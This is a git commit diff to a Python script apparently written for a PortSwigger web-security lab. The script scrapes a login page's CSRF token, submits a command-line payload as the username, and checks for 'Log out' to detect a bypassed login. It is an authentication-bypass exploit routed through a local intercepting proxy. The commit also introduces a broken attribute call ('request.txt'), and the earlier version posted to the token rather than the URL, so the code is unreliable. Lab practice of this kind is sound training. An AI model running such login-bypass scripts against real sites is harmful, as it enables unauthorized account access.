4a6a22ea29d3388808988f44521920e340a3a611
Dev3sh <devesh.shrestha21@gmail.com>
2026-05-27 12:05:14 +0545

    Update labtwo.py

--- Port-Swigger/labtwo.py
+++ Port-Swigger/labtwo.py
@@ -1,26 +1,27 @@
+import bs4
 import requests
 import sys
 import urllib3
 from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def csrfToken(session, url):
+def token(session, url):
     request = session.get(url, verify=False, proxies=proxies)
-    soup = BeautifulSoup(request.text, 'html.parser')
-    inp = soup.find("input")
-    if not inp or 'value' not in inp.attrs:
-        print("[-] error: csrf input not found")
-        return None
-    csrf = inp['value']
+    soup = BeautifulSoup(request.txt, 'html.parser')
+    search = soup.find("input")
+    csrf = search.get("value") if search else None
     return csrf
 
 def exploit(session, url, payload):
-    csrf = csrfToken(session, url)
-    data = {"csrf": csrf, "username": payload, "password": ""}
-    request = session.post(csrf, data=data, verify=False, proxies=proxies)
-    if "Log out" in request.text:
+    csrf = token(session, url)
+    data = {"csrf": csrf,
+        "username": payload,
+        "password": "nil"}
+    request = session.post(url , data=data, verify=False, proxies=proxies)
+    response = request.text
+    if "Log out" in response:
         return True
     else:
         return False
@@ -31,7 +32,8 @@ if __name__ == "__main__":
         payload = sys.argv[2].strip()
     except IndexError:
         print(f"[!] syntax-error: {sys.argv[0]} <url> <payload>")
-        sys.exit()
+        sys.exit(1)
+
     session = requests.Session()
     if exploit(session, url, payload):
         print("[+] status: success")
